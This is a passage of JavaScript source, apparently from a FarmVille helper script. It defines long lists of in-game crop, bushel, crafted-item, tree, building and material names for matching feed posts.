				"green rose","golden popp","red clover","black rose","white poinsettia","pink aster","electric rose","star flower",
				"chrome dais","sun popp","english rose","forget me not","spring squill","lilac daffy","lady slipper","black tulip",
				"snow tulip","glacial rose","red rose","landini lilies","bells of ireland","double pikake","yellow hibiscus",
				"hawaiian orchid","lava flower","purple orchid","grass widow","night cereus","royal forget-me-not","sundew plant",
				"walking iris","pitcher plant","dragon flower","royal mum","water lily","forbidden lily","yellow marigold",
				"orange marigold","licorice plant","cherry blossom","peace flower","evening flower",
				
				"edelweiss","lotus","hollyhock","columbine","cornflower","gardenia","foxglove","peony","lokelani","dandelion",
				"spiral flower","lotus","flamingo","cherokee rose","bluebell","poinsettia","gladiolus","sunflower","lilac",
				"daffodil","iris","saffron","lavender","clover","daylil","lily","alfalfa","flax","agave","begonia","ivy",
			].fixOrder();
				
		var seafoodTypes=["forbidden calamari","forbidden rock cod","clam","lobster","seafood","shrimp","oyster","mussel",
				"yellowfin tuna","rock crab","ono","hamachi","grouper","squid","rock cod","prawns","scallop","forbidden unagi",
				"unagi"
			].fixOrder();
			
		var hauntedTypes=["wolfsbane","jack o'lantern","tombstone","zombie","sage","green toadstool","ghoul garlic","spectre berries",
				"franken fruit","wormwood","phantom frond","candied corn"].fixOrder();
				
		var mistletoeTypes=["choco mint","cider apple","flint corn","frost holly","holiday cactus",
				"holiday poinsettia","hollowberry","honey ginger","jingleberry","light orchid","potatornament","rudolph radish",
				"wax beans","white cranberry","winter grain","winter squash"].fixOrder();
				
		var enchantedglenTypes=["ambrosia tulip","boggart bulb","butterfly rose","dark dahlia","dream cotton","elfin tea","fairy foxglove",
				"goblin vine","gossamer ivy","honey melon","nectarkin","pixieberry"].fixOrder();
				
		//list of bushels needed per crafting cottage

		var bakeryBushels=["pumpkin","wheat","strawberry","carrot","pepper","ghost chili","pattypan","onion","rice",
				"blueberry","blackberry","raspberry","peanut","sugar cane","pea","broccoli","asparagus",
				"coffee","oat","cucumber","basil","tomato","ginger","posole corn","potato","red wheat","cranberry",
				"white pumpkin","green rose","pink carnation","butter & sugar corn","cauliflower","rye","shrimp",
				"taro"].toDefinitions("bushel_");
				
		var pubBushels=["hops","barley","red currant","royal hops","english rose","english pea","bluebell","spring squill",
				"cornflower","black tea","pink aster","field bean","electric rose","pink carnation","kennebec potato",
				"radish","turnips","darrow blackberry"].toDefinitions("bushel_");
				
		var wineryBushels=["rice","cranberry","white grape","sugar cane","strawberry","grape","raspberry","blueberry","tomato",
				"pepper","carrot","green tea","lilac","blackberry","basil","ginger","pumpkin","acorn squash","cucumber",
				"squash","pink rose","lavender","morning glory","sunflower","yellow melon","watermelon","white pumpkin",
				"greeen rose","pink carnation","cove cranberry","tarragon","hawaiian ginger","rye","oyster","ghost chili"].toDefinitions("bushel_");
				
		var craftshopBushels=["cotton","soybean","carrot","chickpea","sunflower","barley","tomato","aloe vera","jalapeno",
				"pink aster","rhubarb","peanut","leek","wheat","strawberry","lilac","cranberry","double grain","morning glory",
				"coffee","black tea","spring squill","cornflower","rice","rye","spinach","pattypan","field bean","cotton",
				"pepper","red tulip","foxglove","golden popp","grape","red currant","radish","hops","english pea","bluebell"].toDefinitions("bushel_");
				
		var spaBushels=["pumpkin","cranberry","sunflower","blueberry","morning glory","aloe vera","green tea","blackberry","lilac",
				"basil","iris","sunflower","pepper","red tulip","ghost chili","lily","lemon balm","ginger","coffee",
				"purple popp","daffodil","strawberry","pink rose","lavender","white pumpkin","green rose",
				"daylily","dill","kelp","double pikake"].toDefinitions("bushel_");
				
		var restrauntBushels=["darrow blackberry","chandler blueberry","strawberry","red clover","hay","rhubarb","butter & sugar corn",
				"tarragon","pepper","wheat","raspberry","white grape","cove cranberry","red currant","green tea","dill",
				"lady slipper","field beans","cauliflower","tomato","pumpkin","hops","daylily","black tea","peppermint",
				"pineapple","kennebec potato","clam","leeks","red clover","basil","lobster","seafood"].toDefinitions("bushel_");
				
		var sweetshoppeBushels=["gingerbread","iced rice","sunflower","gummi bear","candied yam","wheat","glacial rose","cranberry",
				"peanut","holly","red iceberry","chickpea","mint candy","coffee","snow tulip","sugar cane","iceberg lettuce",
				"pumpkin","frozen grapes","blueberry","rye","iceberg lettuce","carrotcicle","pattypan","leeks","blackberry"].toDefinitions("bushel_");
				
		var tikibarBushels=["taro","hilo pineapple","kona coffee","yam","lilikoi","double pikake","yellow hibiscus","oyster",
				"golden sugar cane","hawaiian orchid","hawaiian ginger","kelp","shrimp","yellow fin tuna","mussel","rock crab",
				"ono","chickpea","spinach","sugar cane","strawberry","white grape","pepper","blueberry","coffee","leek","rice",
				"jalapeno","carrot","tomato","onion"].toDefinitions("bushel_");
				
		var teagardenBushels=["imperial tea","lowland ginger","green tea","baby corn","chinese cotton","sugar cane","nori",
				"hamachi","rice","unagi","squid","wheat","millet","prawns","lotus","edamame","azuki","chinese daikon","grouper",
				"ginger","rye","sesame","jade bamboo","coffee","sticky rice","sichuan pepper","pepper","bok choy","jalapeno",
				"white cloud tea","jade peanut","wasabi","cabbage","eggplant","scallop","soybean","basil"].toDefinitions("bushel_");
				
		var potionshopBushels=["spectre berries","jack o'lantern","grape","wormwood","green toadstool","aloe vera","tomato",
				"sage","tombstone","ghoul garlic","red tulip","wheat","sugar cane","zombie","rye","blueberry","raspberry"].toDefinitions("bushel_");
				
		var patisserieBushels=["choco mint","cider apple","flint corn","frost holly","holiday cactus","holiday poinsettia",
				"hollowberry","honey ginger","jingleberry","light orchid","potatornament","rudolph radish","wax beans",
				"white cranberry","winter grain","winter squash","coffee","lavender","sugar cane","tomato","peppermint","rye",
				"sunflower","bell pepper","blueberry","cranberry","jalapeno",
			].toDefinitions("bushel_");
			
		var fairykitchenBushels=["ambrosia tulip","boggart bulb","butterfly rose","dark dahlia","dream cotton","elfin tea",
				"fairy foxglove","goblin vine","gossamer ivy","honey melon","nectarkin","pixie berry"].toDefinitions("bushel_");
		
		//this array used to clear highlights
		var allCraftBushels=[].concat(bakeryBushels,pubBushels,wineryBushels,craftshopBushels,spaBushels,restrauntBushels,sweetshoppeBushels,tikibarBushels,teagardenBushels,potionshopBushels,patisserieBushels,fairykitchenBushels);
		
		//Crafting cottage items
		//define separately for easy options menu
		var craftPub=["duke's stout","oliviaberry beer","lionhead ale","barley crumpet","floral scone","red currant trifle",
				"rosehip tea","spark rose mead","pink carnation tea","potato soup","blackberry brandy"];
		
		var craftWinery=["sweet sake","white sangria","red table wine",
				"fruit wine","spicy tomato juice","dry sake","blackberry wine","strawberry & cranberry juice","raspberry wine",
				"blueberry wine","herbal elixir","pumpkin vinegar","cucumber wine","rose petal water","melon juice","pumpkin cider",
				"green rose water","carnation vinegar","tarragon vinegar","cranberry cooler","daiquiri","ice wine",
				"snowflake cocktail","island ginger beer","oyster shot","jade falls beer","plum wine"];

		var craftSpa=["fresh sachet","floral perfume","soothing herbal lotion","relaxation oil","devotion perfume","petal sachet",
				"energizing lotion","restoring candle","lily of the valley soap","iris soap","meditation candle","pick me up sachet",
				"farmer's frenzy perfume","daffodil lotion","transcendent candle","harvest candle","green potpourri","daylily perfume",
				"dill candle","gingerbread candle","mint lotion","snowflake soap","flower lei","seaweed soap","lotus candel","bubble tea"];		

		var craftBakery=["pumpkin bread","strawberry shortcake","spicy muffin","patty pan tart","triple berry pie","peanut butter cookie",
				"raspberry blondie","vegetable tart","mocha-berry cake","oatmeal cookies","baked cucumber","pizza bread","ginger snaps",
				"potato and onion bread","carrot cake","harvest casserole","green mocha cake","candied pink carnation","cornbread",
				"cauliflower gratin","gingerbread cake","ice cream carrot cake","snowflake cookie","shrimp toast","egg bread",
				"green tea ice cream","green onion pancake"];
				
		var craftRestraunt=["blackberry ice cream","cheddar cheese","creamed corn","wild blueberry pie","black raspberry wine","fruit cider",
				"dill potato skin","jonny cake","cranberry-pineapple relish","clam chowder","baked beans","cream pie","new england lager",
				"boiled dinner","lobster roll"];

		var craftSweetShoppe=["candied apple","candied yam pie","candy cane","daiquiri","frozen fruit tart","ginger s'more",
				"gingerbread candle","gingerbread house","healthy donut","holly wreath","ice cream sundae","ice wine",
				"lollipop","mint lotion","orange taffy","peanut brittle","peppermint fudge","rock candy","sorbet","sugar snowflake"];
				
		var craftTikiBar=["poi","pineapple sunrise","coffee & cream","inamona","sweet and sour shrimp","plantation iced tea",
				"pineapple hash","shrimp salad","hawaiian kabob","island fried rice","mussel poke","yam fries","seaweed soup",
				"shave ice"];
				
		var	craftTeaGarden=["chow mein","fried rice","ikura nigiri","hot and sour eggplant","kimchi","portuguese rice","milk tea",
				"pho soup","bibimbap","vietnamese iced coffee","egg tart","bao","egg roll","oolong tea","congee","takoyaki",
				"hamachi maki","moon cake","thai tea"];
				
		var craftPotionShop=["nightshade sherbet","pumpkin pie","witch's brew","cauldron stew","invisibility potion","crystal cocktail",
				"bottled spirit","candied corncob","fire brew","lucky charm","stink bomb","sleeping smoothie","vampire venom",
				"viscous vitality","werewolf bane"];
				
		var craftMistletoeLane=["winter casserole","white cranberry muffin","stuffed squash","squash mousse","potato latke","poinsettia gimlet",
				"jingleberry ice cream","hot mint chocolate","hollow berry pie","holiday pudding","gingerbread house","frost holly sherbet",
				"cranberry turtle bar","corn relish","blackberry champagne","benne cake","apple cider"];
				
		var craftFairyKitchen=["ambrosia","boggart bread","bog stew","dahlia drops","dream cookie","elfin chocolate",
				"foxglove turnover","goblin wine","gossamer pie","midsummer tea","pixieberry crumpet","nectar licorice",
				"queens delight","rose cake"];
		
		//I dont know if the craftshop does or will ever actually share an item, but if it does, add them here.
		var craftShop=["bright yellow tractor","mechanic scarecrow","sheep topiary","apple red seeder","bonsai",
				"tree house","apple red harvester","post office","evergreen train","farmhand","yellow racer tractor",
				"stone wall","fertilize all","dainty fence","shovel","watering can","iron fence","arborist",
				"lamp post","animal feed","vehicle part","swiss cabin","stone archway","milking stool","scythe",
				"brick","wooden board","nail","lucky penn","fuel","bottle","love potion","pine fence i",
				"pine fence ii","modern table","puppy kibble","dog treat","moat i","moat ii","moat iii","moat iv",
				"moat corner i","moat corner ii","moat corner iii","moat corner iv","castle bridge","england postcard",
				"beach ball","magic snowflake","ice pig sculpture","ice horse sculpture","horse sculpture"].fixOrder();

		var craftUnidentified=["chardonnay frosted cake","chardonnay preserves","zinfandel sachet","zinfandel wine"];

		//merge craft types for searching
		var craftTypes=[].concat(craftBakery,craftSpa,craftWinery,craftPub,craftShop,craftRestraunt,craftSweetShoppe,craftTikiBar,craftTeaGarden,craftPotionShop,craftMistletoeLane,craftFairyKitchen,craftUnidentified);	
		
		//only those crops that can provide crossbred seeds
		var seedTypes=["straspberry","long onion","squmpkin","red spinach","lilac daffy","fire pepper","double grain","purple tomato",
				"sun poppy","whisky peat","purple orchid","flame pepper"].fixOrder();

		//only those crops that can be of the supercrop status
		var superCrops=["strawberry","pumpkin","cotton","cranberry","pepper","grape","pink aster","watermelon","yellow melon"].fixOrder();

		//merge all crop types for actual searches
		//do not merge with seedTypes and superCrops as they are searched for differently
		var bushelTypes=[].concat(flowerTypes,fruitTypes,grainTypes,vegTypes,seafoodTypes,hauntedTypes,mistletoeTypes,otherBushels,specialBushels).fixOrder();

		//trees
		var treeTypes=[//multiple words
				"alma fig","angel red pomegranate","autumn ginkgo","bahri date","bay laurel","bird cherry",
				"black locust","blood orange","bubble gum","chanee durian","chinese lantern","chinese strawberry",
				"chinese tamarisk","chrome cherry","cork oak","crab apple","crack willow","cuban banana","disco ball",
				"downy birch","dwarf almond","elberta peach","european beech","european pear","golden apple",
				"golden apricot","golden malayan coconut","golden plum","golden starfruit","granny smith apple",
				"hass avocado","heart candy","indian laurel","key lime","manila mango","midland hawthorn","mimosa silk",
				"mint candy","mission olive","monterey cypress","mountain ebony","ornament 2","peach palm","kamani nut",
				"picholine olive","pink dogwood","ponderosa lemon","purple hanging flower","purple magnolia","ohia ai",
				"rainbow apple","rainier cherry","red alder","red maple","red pine","royal crystal","ruby guava",
				"sartre guava","shinko pear","silver maple","singapore jackfruit","star ruby grapefruit","umbrella pine",
				"vera wood","white pine","white plumeria","white walnut","wild cashew","wild service","wych elm",
				"yellow maple","yellow passion fruit","african tulip","japanese maple","lombardy poplar","white cedar",
				"speckled alder","umbrella bamboo","pin oak","weeping birch","bradford pear","european aspen",
				"dahurian birch","gold tinsel","montmorency cherry","paperbark maple","bitternut hickory","purple holiday",
				"shagbark hickory","golden bell","winter spruce","ice crystal","radiant sun","starry night","a sweater",
				"schreink's spruce","yellow rowan","pink magnolia","poinsettia","white apple","pink plum","heart shape",
				"spruce birdhouse","red rocket crape","pink trumpet","pink smoke","oklahoma redbud","kwanzan cherry",
				"tonto crape","california redbud","northern catalpa","hawaiian cherry","rainbow gum","yellow plumeria",
				"yellow magnolia","choco macadamia","white wisteria","sugar apple","candle nut","majestic redwood",
				"sparkling palm","banana peel","mountain silverbell","corinthian peach","red horse chestnut","may ribbon",
				"kilimarnock willow","crimson cloud hawthorn","ice cream sundae","kalamata olive","white weeping cherry",
				"japanese persimmon","royal poinciana","scarlet buckeye","chainfruit cholla","dragon's blood","date palm",
				"pink rose","pacific madrone","western red cedar","pink diamond","quaking aspen","moth orchid","foxtail palm",
				"yellow hibiscus","conch shell","stone pine","blue cloud","yellow watermelon","pink camellia","stormy cloud",
				"chinese rain","tung oil","japanese snowbell","oyama magnolia","jade bamboo","crystal banana","cisten plum",
				"japanese angelica","japanese privet","mystic wave","mystic water","sweet gum","blue rose","purple tulip",
				"black elderberry","gold thread","boogie board","saucer magnolia","chickasaw plum","pecan pie","lightning bug",
				"white cypress","red willow","gold medal","english oak","blue bell","cistena plum","deep yellow wood",
				"venetian chandelier","nautical star","old vine","match stick","water droplet","red mulga","dawn eucalyptus",
				"fairy lantern","fairy plum","fairy bell flower","neon palm","dream trumpet","purple glitter palm","toy doh",
				"glitter plum","stacking rings","scorpio zodiac","fire & ice","magic lamp","magic wand","leo zodiac",
				"green chili","hardy kiwi","pagoda dogwood","ice diamond","southwestern chitalpa","magical sugar maple",
				"amur maple","bat wing","falling leaves","black pumpkin","dark dogwood","ghostly banana","pumpkin carriage",
				"fire green apple","winter squash","vampire bat","sweet tooth","halloween glass","cat topiary","monster puff",
				"paper bag","la rosa","sapphire pixie","dewdrop flower","dewdrops web","tres leches","paper flower",
				"citrus wreath","fall flowers","glitter microphone","stage lights","bass clef","hair comb","paint brush",
				"panda toy","pocket watch","needle & thread","metallic fir","european silver fir","frosty bell","rope light",
				"rainbow snowflake","sparkling snowball","swirl mint","rock candy","cinnamon roll","pumpkin cake","cran jelly",
				"lamp shade","cake pop","wooden button","hat box","holiday cupcake","mint gumball","mixed nut","vintage patchwork",
				"snow lights","toy nut","crown jewel","st basil's cathedral","chamomile cluster","christmas list","russian egg",
				"royal cape","silver orange","red light","time sq.","ball drop","balloon animals","falling streamers",
				"mylar unicorn balloon","star balloon","water balloon","ballet cake","crystaline toadstool","curtain call",
				"glowing tulip","i heart ny apple","liberty torch","magic feather","music box","pizza pie","purple ivy",
				"radio city","on sale","new arrival","tinsel maple","loud noisemaker",
	
				//single words
				"amherstia","apple","ash","banana","broom","breadnut","cashew","date","gem","ginkgo","gulmohar","hazelnut",
				"holiday","jackfruit","lemon","longan","mango","oak","olive","ornament","pine","tamarind","walnut","chicle",
				"candelabra","melaleuca","halloween","pistachio","moon","lychee","durian","popsicle","empress","tulip",
				"jaca","shamrock","ohia","banyan","perfume","tempskya","goldenchain","carob","baobab","daisy","goat",
				"ribbon","octopus","candle","gerber","sunrise","dusk","sunflower","star","willamsonia","saxophone","lilac",
				"gladiolus","chaste","tachibana","awarra","sandbox","rubber","flippers","mars","galaxy","celtic","comet",
				"topiary","anchor","gordonia","riberry","ceiba","patchouli","macrame","marula","zebra","oleander","smore",
				"bubble","jungle","honeyberry","goldenrain","blackthorn","vitex","glowy","garlic","mummy","zombie","fang",
				"staircase","broomstick","acorn","beehive","calaveritas","squash","microphone","pie","cube","embroidery",
				"jacks","marbles","sun","feast","donut","starlite","snowman","nutcake","blackforest","zipper","angel",
				"beet","throne","scepter","igloo","iceberg","noisemaker","spice","sugar","candlelight","coal","gadget",
				"hanger","coupon",
			].fixOrder();
		
		//giant trees
		//do not provide the words big or giant in front of these as that is done programatically later
		var treeTypes2=[//multiple words
				"bell flower","black cherry","candy apple","caramel apple","chocolate heart","chrome cherry","hot cocoa",
				"cocoa truffle","disco ball","fleur de lis","french bread","frozen gem fruit","golden apple","heart candy",
				"july balloon","july confetti","july ice cream","ice cream sundae","lucky cookie","mardi gras","pink gem","red gem",
				"purple bubble gum","ribbon flower","sour apple","spring egg","magic orange","star flower","magic peach",
				"halloween candy","candy corn","fire peach","jack o lantern","halloween lantern","dark apple","trick or treat",
				"halloween cookie","candy pumpkin","dark peach","honeycrisp apple","sugar skull","halloween candle","golden fairy",
				"forbidden gem","purple crystal","santa hat","golden holiday","fall ribbon flower","snowy gumdrop","snowflake ii",
				"holiday cookie","candy cane","holiday candle","holiday chocolate","holiday corn","spiral crystal","gum drop",
				"fraiser fir","teddy bear","party hat","frozen apple","holiday lantern","jingle bell","new year lantern",
				"white golden apple","icy peach","ice sculpture","amethyst gem","frosted fairy","winter spirit","bare crystal",
				"gem fruit","broken heart","spruce birdhouse","sugar cookie","dark heart","heart cotton candy","valentine cookies",
				"dark butterfly","heart balloon","potato chips","spring apple","dark willow","white trumpet","caribbean trumpet",
				"celtic knot","gold sitka spruce","red coral","monkey pod","flip flop","dog treat","lucky charm","sea shell",
				"sand dollar","rocky candy","mini cupcake","gummy bear","star fish","crystal ball","majestic redwood",
				"sparkling palm","coconut punch","fire apple","lava stone","lava banyan","fire gem","ribbon candy","hard candy",
				"strawberry cake","dinosaur eggs","dinosaur fossil","chocolate apple","ice cream","tea party","spring cookies",
				"bumble bee","yellow shower","diamond ring","enchanted iris","pink pearl","kwanzan cherry","queen's crape",
				"rainbow shower","angel trumpet","bristlecone pine","young sequoia","paper umbrella","skinny palm","paper flower",
				"candy bouquet","white pearl","mother's cookies","blue ribbon baobab","pink diamond","baby bundle","red dogwood",
				"red magnolia","cake pop","impressionist ii","fan palm","ice cream mango","crystal cave","red cassia",
				"rainbow cotton candy","bell pepper","phoenix fire","stained glass","art deco","crown flower","black apple",
				"muskogee crape","natchez crape","feather palm","brazil nut","animal cloud","chinese mulberry","summer cherry",
				"jade fireworks","asian white birch","fujian birch","white mulberry","chinese hackberry","cherry blossom",
				"ginkgo maple","golden larch","glowing lantern","dragon boat","beach ball","evergreen pear","hand fan",
				"lava flower","navel orange","birthday hat","birthday candles","fortune cookies","party favor","wind chime",
				"animal balloon","crystal heart","liberty bell","july firework","grenada pomegranate","japanese fern","luxe gem",
				"possumhaw holly","ring pop","rainbow prism","mystic stone","tropical bird","july cupcake","pink lemon",
				"magic mushroom","glass slippers","water slide","twisting vine","red willow","white cypress","magnifying glass",
				"star anise","shave ice","mexican hand","australian boab","trident maple","three flowered","purple japanese",
				"japanese wisteria","purple empress","moonlit mulberry","harmony bonsai","venetian mask","sea star","ribbon wand",
				"cedar carriage driver","farmville games","eccentric elm","shooting star","fairy wing","solar power","tie dye",
				"dream trumpet","chinese rain","tribal mask","satellite dish","chinese fringe","chinese tallow","red umbrella",
				"korean white beam","kaki persimmon","rainbow glitter","white cloud","glitter butterfly","toy brick","wolf full moon",
				"starry willow","pirate sail","treasure map","albino redwood","skull & bones","ice diamond","cats eye","tiger eye",
				"elephant ear","juicy apple","juicy pear","fire orange","travelers palm","himilayan yew","dracaena draco",
				"witch vine","twilight willow","blue jackolantern","witch hat ii","pink skull","spooky lantern","rotten apple",
				"decorated halloween","bright candy corn","dark bramble","witch hat","scary haunted","wicker basket","witch pumpkin",
				"spooky crystal","pumpking light","phantom oak","lava lamp","lacey parasol","ghost willow","fire cherry","beach plum",
				"chocolate pickle","deadly nightshade","enchanted yew","ghost decoration","hollow lantern","jelly bean","jelly blob",
				"purple angel trumpet","sound wave","spooky moss","tesla coil","treble clef","full moon","carved lantern",
				"solar eclipse","stone willow","wisp willow","amber maple","dark candle","dark jewel","dark rose","hallow willow",
				"egg nog","fall bouquet","fall candle","fall cupcake","cornucopia ii","paper fire","tarot card","african pear",
				"autumn umbrella","black dragon","silver fir","french fry","frozen yogurt","hot pink","metallic fir","snow glow",
				"nutty ice cream cone","parasol ii","paw paw","wooden button","frosted maple","frost holly","glitter holiday",
				"gold holly","green tinsel","hanging snowflake","fall harvest","holiday card","holiday feather","holiday light",
				"holiday hot chocolate","moonlit holiday","poinsettia lantern","silver aluminum","silver jingle","snow globe",
				"sugar plum fairy","toy train","winter magic","american linden","american sycamore","american larch","black oak",
				"eastern cottonwood 2","fall feather","frosted autumn","frost fire maple","japanese stewartia","lacebark elm",
				"persian parrotia","glass prism","rock elm","smooth sumac","sycamore maple","white enkianthus","dragon fruit",
				"fall oak","moreton bay fig","nut clock","tree of light","frozen fire","holiday teddy","dark christmas",
				"basic derby","bass derby","derby boot","salmon derby","trout derby","frozen snowfall","gift card","on sale",
				"lunar conifer","melting snow","new arrival","christmas past","eastern cottonwood","american basswood",
				"bare christmas","big bear","brooklyn bridge","hot chocolate","green yarn","icy flame","metallic crab apple",
				"new year hat","red yarn","tea crab apple","tutti frutti","cider cypress","loud noisemaker","north pole",
				"snowflake meadow","so bright","tinsel maple","winter gharcod","winter sports","bluebird of paradise","gem ii",
				"bird of paradise","butterfly heart","fairy bubble","fairy butterfly","fairy lantern","fairy light","fairy shoe",
				"fairy snowflake","large tulip","mint candy conifer","mystical fire","pixie maple","prism pine","rainbow leaf",
				"red rose","silver bark","yellow rose","glass buttefly",

				//single words
				"broom","bubblegum","cupcake","father","jewel","balloon","mac&cheese","rainbow","snowcone","wedding",
				"fairy","mossy","spider","butterfly","gnarled","labyrinth","speaker","cornucopia","bowtie","stocking",
				"borealis","snowflake","gingerbread","nutcracker","poinsettia","present","firework","noir","snowball",
				"whittled","sculpted","sapphire","wilted","gem","heart","sweater","cocoa","heartflake","cupid","mask",
				"headdress","sequin","shamrock","blossoming","instrument","clover","emerald","lollipop","prism","beads",
				"tiki","label","shade","miracle-gro","bjuvia","mustache","wing","sprung","corsages","origami","dragon",
				"earth","lace","basket","lei","chandelier","candle","birthstone","impressionist","cypress","wolfsbane",
				"aromita","crown","sword","dandelion","salad","climbing","dove","fruit","sachet","pinwheel","volleyball",
				"alexandrite","geode","coin","shuriken","dumpling","parasol","clog","mechanical","martian","robot",
				"metasequoia","champak","teak","torch","jujube","sail","trophy","gelato","alstonia","horseshoe","steel",
				"gemstone","treasure","goblet","peace","hologram","camphor","wishing","smore","bubble","snake","manchineel",
				"mahogany","tornado","turquoise","puzzle","grocery","constellation","pencil","peumo","wizard","mercury",
				"aquarius","ceres","capricorn","lunar","aries","venus","jupiter","apollo","celestial","parrot","sigillaria",
				"haunted","ghost","spooky","thorny","vampire","cauldron","haybale","spiderweb","scarecrow","ume","tp",
				"drumstick","note","pixie","sandalwood","banapple","seasons","celery","denim","kite-eating","kumquat",
				"skyline","wutong","zipper","bark","reindeer","gharqad","goldenrain","araguaney","gadget","hanger",
				"lightwire","coupon","toy","icicle","sugar","spice","pohutakawa","coal","dreidel","candlelight","tangled",
				"strawnango","snowshoe","book","allium","amaryllis","dew","dryad","flower","gerbera","guardian","ladybug",
				"mushroom","pansy","raindrop","sparkle","whispy","ray","rose","pawpaw",
			].fixOrder();
			
		//bonsai trees
		var treeTypes3=["pink azalea","white wisteria","rainbow prism","red rose","flowery","tulip","crabapple","bamboo",
				"wisteria","pomergrante","cherry","magic maple","magic gum","camellia","magnolia","orange","fuchsia","ginkgo",
				"pink almond","weeping willow","hibiscus","andromeda","azalea","gem","quince","chinese perfume","honeysuckle",
				"crown of thorn","crape myrtle","gardenia","dwarf plum","lavender star","key lime","bobbing apple","rhododendron",
				"candycorn","lilac","white jasmin","desert rose","maple","dogwood","fringe","lantana","powder puff","habanero",
				"amethyst","delphinium","forsythia","grape","neea","plum","rainbow butterfly","rainbow chili","star","white pine",
				"red ribbon","adenium","beech","brazilian rain","christmas","chrysanthemum","yarn",
			].fixOrder();
				
		//building type catcher for random materials
		var buildings=["maison","nursery barn","botanical garden","japanese barn","beehive","garage","pig pen","haunted house",
				"orchard","turkey roost","funhouse","gingerbread house","winter workshop","party barn","duck pond","combine",
				"cupid's castle","greenhouse","leprechaun's cottage","sheep pen","spring garden","craftshop","bedazzled cottage",
				"water wheel","crafting silo","horse stable","wildlife habitat","winter pet run","winter zoo","winter aviary",
				"cove","winter livestock pen","castle duckula","harvest hoedown","winter animal pen","winter wonderland train station",
				"snow treasure","santa's sleigh","winter water wheel","winter pasture","winter paddock","feed mill","ice palace",
				"crop mastery billboard","romantic carriage","animal mastery billboard","tree mastery billboard","baby playpen",
				"baby bunny hutch","recipe mastery billboard","volcano reef","aquarium","island paddock","island pasture",
				"island zoo","island livestock","island aviary","island pet run","island habitat","market stall","hawaiian treasure",
				"jade gnome garden","candy castle","grove","beach resort","fishing hole","gas pump","hot spring","mountain palace",
				"jade habitat","jade playpen","jade pasture","jade aviary","jade paddock","jade aquarium","dino lab","bloom garden",
				"ultimate treehouse","jade wildlife pen","jade pet run","jade zoo","gnome garden","floating waterfall","imperial shipyard",
				"swimming pond","unicorn island","master lu's study","harmony garden","sunshine doghouse","cupcake doghouse","dream house",
				"baby nursery","sturdy doghouse","sporty doghouse","floating castle","turtle pen","arborist center","farmhand center",
				"dragon lair","tomb treasure","animal workshop","haunted mansion","spooky paddock","scary aviary","wildlife cave",
				"holiday cow pasture","holiday pet run","holiday zoo","holiday livestock pen","monster lab","seedling nursery",
				"witchin' cauldron","tree of life","duckula's castle","ferris wheel","bumper cars","big windmill","sally's seed shop",
				"nightmare zoo","deadly livestock pen","haunted pasture","horrendous pet run","bloom mastery billboard",
				"wishing fountain","bonsai garden","holiday square","holiday treasure","holiday aviary","joyful horse paddock",
				"magic wildlife cave","big barnyard","cheery house","extinct animal zoo","herb garden","penguin skate park",
				"crystal garden","enchantment shop","home mushroom","rivermist fortress","troll treasure","glen aviary","glen paddock",
				"glen cow pasture","glen livestock pen","glen petrun","glen wildlife cave","glen zoo","glen gnome garden",
				
				"horse paddock","livestock pen","aviary","zoo","pet run","cow pasture",
			].fixOrder();

		//material types
		//defined separately for easy options menu
		var standardMaterials=["goo ","haunted brick","knockers","creepy candle","clay brick","wooden board","harness","horseshoe",
				"aged brick","clinging vine","paned window","slate tile","weathered board","blue baby blanket","bottle","floral bracket",
				"glass sheet","green beam","irrigation pipe","white trellis","bamboo rail","reed thatch","smoker","beeswax","shovel", 
				"gear","axle","rope","hammer","twine","concrete","hinge","screwdriver","tin sheet","vehicle part","pink baby blanket",
				"honeybee","wrench","clamps","pipe","shrub","grazing grass","fence post","painted wood","water pump","log","stone lantern",
				"steel beam","wire","hay bundle","saddle","bridle","punch","snacks","paint","red beam","screw","aluminum siding",
				"candy cane beam","conifer dust","ice post","rail spike","rail tie","coal","pickaxe","hair dryer","milk and cookies",
				"gps","silver bell","holiday lights","reindeer treat","holiday cheer","snow axle","snow chain","snow gear","sack ",
				"scoop ","belt ","snow brick","snowflake","ice nail","snow globe","ice board","frozen beam","blue roller","white paste",
				"white paper","white overalls","black light","light plywood","love","flower trim","fancy chocolate","cozy blanket",
				"horse treat","carriage lamp","green paper","green light","orange overalls","red paste","red roller","dark plywood",
				"wood stain","masking tape","scaffolding","brush","blanket","salt lick","sod piece","grass seed","water pail",
				"raw wood","feed bucket","wooden peg","baby carrot bunch","bunny bed","branch ball","hutch wire","bunny tunnel",
				"wood block","wood glue","clamp","sand paper","baby fish","ocean rock","stony coral","volcano monitor","buoy",
				"filter","small fishing net","large fishing net","small crowbar","large crowbar","awning","basket","price card",
				"garden fence","daffodil","potting soil","twig","tiny window","toadstool","chocolate brick","gingerbread siding",
				"gumdrop accent","lollipop lamp","marshmallow mortar","cotton candy insulation","mulch soil","turf roll","mini boulder",
				"swim suit","beach sandal","tropical cup","lure","lily pad","fishing pole","fuel pipe","level gauger","steel sheet",
				"bed rock","mineral infusion","steam","stone pillar","terra cotta","hanging incense","small axe","boat hook","wheelbarrow",
				"cement","fill dirt","metal post","flower tie","garden edging","trellis","floating rock","sparkle seed","baby mobile",
				"magic water","rigging","sail","wood plank","leaf net","water bucket","skimmer","parchment","dowel","book","yellow bamboo",
				"zen sand","stone pick","rainbow clover","heart of gold","enchanted blossom","chew toy","dog bed","tennis ball","trough",
				"queen bee","pacifier","drift wood","java fern","scientific scale","research paper","tree incubator","cloning solution",
				"massage stone","buffet tray","cloud brick","enchanted bamboo","hovering charm","dragon spell","chisel","talisman",
				"magic boulder","gold dust","stamp","ball of wool","mallet","stone","nail","cut bamboo","brick","cobweb","old fence",
				"deadwood","rusty gear","rusty post","thunder cloud","fertilizer stake","mulch","seedling tray","ladle","enchanted iron",
				"gummy tentacle","life essence","magic bubble","puffy cloud","gondola","carnival light","bearings","steering wheel",
				"wooden shaft","wooden cog","barnyard shingle","purple roller","windmill blade","wooden giraffe","wooden tiger","bumper",
				"wooden zebra","drying rack","flower apron","green tape","yellow paper","seatbelt","pepper packet","steering wheel",
				"drill bit","copper tube","bamboo","bonsai pedestal","bonsai pot","grafting tool","everything nice","grain of spice",
				"grain of sugar","lamp post","cobblestone","bench","lumberjack saw","power saw","mystery horse","mystery tree","mystery bloom",
				"meteorite","broken thermometer","food chain","clay pot","special soil","peat pellet","corporate sponsor","icicle ramp",
				"snow machine","water","crystal seed","crystal","mithril ore","star rock","warpstone","sun light rope","moon gem",
				"armillary sphere","fairy dust","magic maple","rain drop","vial of sunlight","magic mushroom",

			].fixOrder();
				
		var fixTitles={/*no longer works*/};

		var otherConsumables=["watering can","puppy kibble","arborist","farmhand","white truffle","flower food",
